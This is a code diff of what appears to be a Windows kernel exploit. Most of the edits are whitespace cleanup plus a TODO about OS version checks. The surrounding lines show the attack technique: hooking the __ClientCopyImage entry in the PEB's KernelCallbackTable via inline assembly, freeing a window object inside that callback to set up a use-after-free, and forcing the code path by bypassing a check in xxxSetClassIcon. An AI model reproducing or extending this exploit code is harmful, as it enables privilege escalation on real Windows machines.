@@ -16,7 +16,7 @@ mail :   Firozimaysam@gmail.com
 twitter : https://twitter.com/R00tkitSMM 
 
 */
-
+// TODO: check OS version , safe fail 
 /*
 
 ref: 
@@ -239,8 +239,8 @@ void CreateSecondWindow()
     wc.cbClsExtra    = 0;
     wc.cbWndExtra    = 0;
     wc.hInstance     = NULL;
-	wc.hIcon         = LoadIcon(NULL,IDI_QUESTION);
-	wc.hCursor       = LoadCursor(NULL, IDI_QUESTION);
+    wc.hIcon         = LoadIcon(NULL,IDI_QUESTION);
+    wc.hCursor       = LoadCursor(NULL, IDI_QUESTION);
     wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
     wc.lpszMenuName  = NULL;
     wc.lpszClassName = g_szClassName;
@@ -282,11 +282,6 @@ NTSTATUS NTAPI hookCCI(PVOID p)
 {
 
 	LARGE_UNICODE_STRING plstr;
-
-	
-
-
-	
 	// free  WND object  
 	DestroyWindow(hwnd);
 	UnregisterClassW(g_szClassName,NULL);
@@ -320,8 +315,8 @@ void* Get__ClientCopyImageAddressInPEB()
 	{
 		  mov edx , 0xD8; // 0x36 *4 ->  API index *4  number  for  __ClientCopyImage
 		  mov     eax,dword ptr fs:[00000018h] // eax=TEB
-          mov     eax,dword ptr [eax+30h] // EAX=PEB
-          mov     eax,dword ptr [eax+2Ch] // EAX=KernelCallbackTable
+         	  mov     eax,dword ptr [eax+30h] // EAX=PEB
+                  mov     eax,dword ptr [eax+2Ch] // EAX=KernelCallbackTable
 		  add	  eax,edx
 		  mov	  address,eax;
 		  int 3
@@ -335,7 +330,7 @@ void* Get__ClientCopyImageAddressInPEB()
 
 void init()
 {
-	   	DWORD prot;
+	DWORD prot;
 
 	LoadLibraryA("user32.dll");
 	CreateSecondWindow();
@@ -384,9 +379,8 @@ void init()
 int  main()
 {
     WNDCLASSEX wc;
-
-		int x;
-	MSG Msg;
+    int x;
+    MSG Msg;
 
     //Step 1: Registering the Window Class
     wc.cbSize        = sizeof(WNDCLASSEX);
@@ -402,8 +396,7 @@ int  main()
     wc.lpszClassName = g_szClassName;
     wc.hIconSm       = NULL; // bypass  "if" inside xxxSetClassIcon to lead  execution  path to callback  
 
-
-	init();
+    init();
 
 /*
 
